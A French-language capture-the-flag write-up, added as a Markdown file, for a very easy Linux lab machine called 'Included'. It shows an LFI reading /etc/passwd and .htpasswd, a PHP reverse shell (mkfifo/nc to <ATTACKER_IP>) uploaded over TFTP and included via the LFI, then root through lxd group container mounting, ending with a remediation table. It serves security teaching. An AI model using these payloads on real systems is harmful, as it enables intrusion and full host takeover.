@@ -1,0 +1,234 @@
+---
+title: Included
+description: WU Included
+categories: [Writeup]
+tags: [writeup]
+template: doc
+sidebar:
+  order: 12
+  badge:
+    text: 'very easy'
+    variant: success
+---
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Linux | <span style="color:green">**VERY EASY**</span> | 10.129.x.x |
+
+## Résumé
+
+Machine Linux exposant un service TFTP sur UDP et une application web vulnérable à une LFI (Local File Inclusion). L'exploitation combine l'upload de fichiers via TFTP et leur inclusion via la LFI pour obtenir un reverse shell. L'escalade de privilèges s'effectue via le groupe `lxd` en montant le filesystem host dans un conteneur privilégié.
+
+---
+
+## Reconnaissance
+
+### Scan de ports TCP
+
+```bash
+nmap -T4 <IP>
+```
+
+```shell wrap
+PORT   STATE SERVICE
+80/tcp open  http
+```
+
+### Scan de ports UDP
+
+```bash
+sudo nmap -sU -T4 <IP>
+```
+
+```shell wrap
+PORT   STATE SERVICE
+69/udp open  tftp
+```
+
+| Port | Protocol | Service | Description |
+|------|----------|---------|-------------|
+| 80 | TCP | HTTP | Apache 2.4.29 (Ubuntu) |
+| 69 | UDP | TFTP | Trivial File Transfer Protocol |
+
+---
+
+## Enumération
+
+### Application web (80)
+
+La page principale charge dynamiquement des fichiers via un paramètre `file` :
+
+```
+http://<IP>/?file=home.php
+```
+
+### Test de LFI
+
+```bash
+curl "http://<IP>/?file=../../../etc/passwd"
+```
+
+Le fichier `/etc/passwd` est affiché, confirmant la vulnérabilité **Local File Inclusion**.
+
+### Fichier sensible dans le dossier web
+
+En explorant les fichiers classiques d'un serveur web :
+
+```bash
+curl "http://<IP>/?file=.htpasswd"
+```
+
+Un fichier `.htpasswd` contient des credentials.
+
+---
+
+## Exploitation
+
+### Stratégie
+
+1. Uploader un fichier PHP malveillant via TFTP
+2. L'inclure via la LFI pour exécuter du code
+
+### Upload via TFTP
+
+TFTP stocke les fichiers dans `/var/lib/tftpboot/` par défaut.
+
+```bash
+# Créer le reverse shell
+cat > shell.php << 'EOF'
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f"); ?>
+EOF
+
+# Upload via TFTP
+tftp <IP>
+tftp> put shell.php
+tftp> quit
+```
+
+### Reverse shell
+
+```bash
+# Terminal 1 - Listener
+nc -lvnp 4444
+
+# Terminal 2 - Déclencher l'inclusion
+curl "http://<IP>/?file=../../../var/lib/tftpboot/shell.php"
+```
+
+Shell obtenu en tant que `www-data`.
+
+### Mouvement latéral
+
+Avec les credentials trouvés dans `.htpasswd` :
+
+```bash
+su mike
+# Entrer le mot de passe trouvé
+```
+
+---
+
+## Escalade de privilèges
+
+### Enumération
+
+```bash
+id mike
+```
+
+L'utilisateur `mike` est membre du groupe `lxd`, permettant de manipuler les conteneurs LXC/LXD.
+
+### Exploitation LXD
+
+L'exploitation consiste à créer un conteneur privilégié et monter le filesystem de l'hôte.
+
+#### Préparation de l'image Alpine
+
+```shell wrap
+# Sur la machine attaquante
+curl -L -o alpine.tar.gz "https://dl-cdn.alpinelinux.org/alpine/v3.10/releases/x86_64/alpine-minirootfs-3.10.0-x86_64.tar.gz"
+python3 -m http.server 8000
+
+# Sur la cible
+cd /tmp
+wget http://<ATTACKER_IP>:8000/alpine.tar.gz
+```
+
+#### Création du metadata LXD
+
+```bash
+mkdir /tmp/lxd && cd /tmp/lxd
+cat > metadata.yaml << 'EOF'
+architecture: x86_64
+creation_date: 1577836800
+properties:
+  description: Alpine
+  os: Alpine
+  release: "3.10"
+EOF
+tar czf metadata.tar.gz metadata.yaml
+```
+
+#### Import et exploitation
+
+```bash
+# Importer l'image
+lxc image import metadata.tar.gz /tmp/alpine.tar.gz --alias myimage
+
+# Créer un conteneur privilégié
+lxc init myimage container -c security.privileged=true
+
+# Monter le filesystem host
+lxc config device add container mydevice disk source=/ path=/mnt recursive=true
+
+# Démarrer et accéder au conteneur
+lxc start container
+lxc exec container /bin/sh
+```
+
+### Root flag
+
+```bash
+cat /mnt/root/root.txt
+```
+
+---
+
+## Flags
+
+```bash
+# User flag
+cat /home/mike/user.txt
+
+# Root flag (depuis le conteneur)
+cat /mnt/root/root.txt
+```
+
+---
+
+## A retenir
+
+| Vulnérabilité | Description | Remédiation |
+|---------------|-------------|-------------|
+| **LFI** | Inclusion de fichiers locaux via paramètre non filtré | Valider et sanitizer les entrées utilisateur |
+| **TFTP exposé** | Service TFTP accessible sans authentification | Restreindre l'accès réseau, désactiver si non nécessaire |
+| **Credentials en clair** | Mot de passe stocké dans `.htpasswd` accessible | Utiliser des mécanismes d'authentification sécurisés |
+| **Groupe lxd** | Membership permet de monter le filesystem root | Limiter les membres du groupe lxd aux administrateurs |
+
+---
+
+## Outils utilisés
+
+- nmap
+- curl
+- tftp
+- netcat
+- lxc/lxd
+
+---
+
+## Références
+
+- [HackTricks - LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
+- [HackTricks - LXD Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
+- [TFTP Protocol](https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol)
